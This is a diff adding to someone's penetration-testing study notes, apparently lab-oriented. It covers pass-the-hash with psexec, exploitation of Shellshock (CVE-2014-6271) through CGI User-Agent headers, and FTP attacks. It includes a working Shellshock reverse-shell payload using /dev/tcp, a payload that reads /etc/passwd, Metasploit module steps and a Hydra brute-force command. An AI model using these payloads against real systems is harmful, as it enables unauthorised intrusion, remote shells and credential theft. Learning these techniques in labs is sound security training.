@@ -269,4 +269,36 @@ DO MIMIKATZ FIRST!
    ![alt text](/assets/hash_dump.png)
 4. background session: `search psexec` look for exploit/windows/smb/psexec
 5. set options: check LPORT and maybe cahnge -> `set RHOSTS` -> `set SMBUSER Administrator` -> `set SMBPASS LM&NTLMHASH` <--- see picture for hash copied -> `set target Command` OR `set target Native\ upload` -> exploit
-6.
+
+##  Frequently Exploited linux services / Linux exploitation and enumeration
+- Apache web server | TCP 80/443
+- SSH | TCP 22
+- FTP | TCP 21
+- SAMBA | TCP 445
+  
+  ### Shellshock(Exploiting Bash CVE-2014-6271 Vulnerability)
+  - Prerequisites: locate an input vector or script that allows you to communicate with Bash
+  - In the context of a web server, we can utilize any legitimate CGI scripts accessible on the web server
+  - Whenever a CGI script is executed, the web server will initiate a new process and run CGI script with Bash
+  - can be exploited manually or mMSF module
+  - Special characters can be inserted in the User-Agent Header(see picture)
+ 1. scan with nmap
+ 2. open web page and inspect the source, look for script
+ 3. Identify with nmap if page is vulnerable: `nmap -sV 10.10.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`
+ 4. Open burp, capture page(or script) and send to repeater, change the user-agent header: `(){ :; }; echo; echo; /bin/bash -c 'cat /etc/passwd/` and send
+ 5. *Reverse shell:* set up netcat listner: `nc -nvlp 1234`
+ 6. In Burp Suite change User-Agent to:  `(){ :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.10.x.x/1234 0>&1` then hit send.
+  ![alt text](/assets/shellshock.png)
+**MSF Shellshock Exploit**
+1. start: `service postgresql start && msfconsole`
+2. search: `search shellshock` look for: `exploit/multi/http/apache_mod_cgi_bash_env_exec` use 5 maybe?
+3. set options: RHOSTS, set TARGETURI `/gettime.cgi` <--- this is the exploitable cgi script
+4. run
+
+### Exploiting FTP
+- FTP port 21, file sharing
+- Can be anonymous access
+- can be a brute force attack
+1. After FTP found: try anonymous `ftp 10.10.x.x` 
+2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* `
+3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
